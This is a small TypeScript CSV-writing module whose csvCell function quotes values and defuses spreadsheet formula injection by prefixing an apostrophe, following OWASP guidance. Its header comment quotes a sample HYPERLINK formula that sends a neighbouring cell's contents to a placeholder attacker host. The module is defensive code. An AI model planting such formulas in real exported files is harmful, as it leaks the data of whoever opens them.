// One CSV cell. Quotes values containing the delimiter, quotes or line
// breaks, and neutralises spreadsheet formulas: a cell starting with
// = + - @ (or a tab / carriage return) is executed by Excel/LibreOffice
// when the file is opened — e.g. an item note of
//   =HYPERLINK("https://evil.example/?d="&E2,"Open")
// would exfiltrate the neighbouring cell. Prefixing an apostrophe makes it
// plain text (OWASP "CSV injection" guidance).
export function csvCell(v: unknown, delimiter = ","): string {
  let s = v == null ? "" : String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
  return s.includes(delimiter) || /["\r\n]/.test(s)
    ? `"${s.replace(/"/g, '""')}"`
    : s;
}

export function csvRow(values: unknown[], delimiter = ","): string {
  return values.map((v) => csvCell(v, delimiter)).join(delimiter);
}
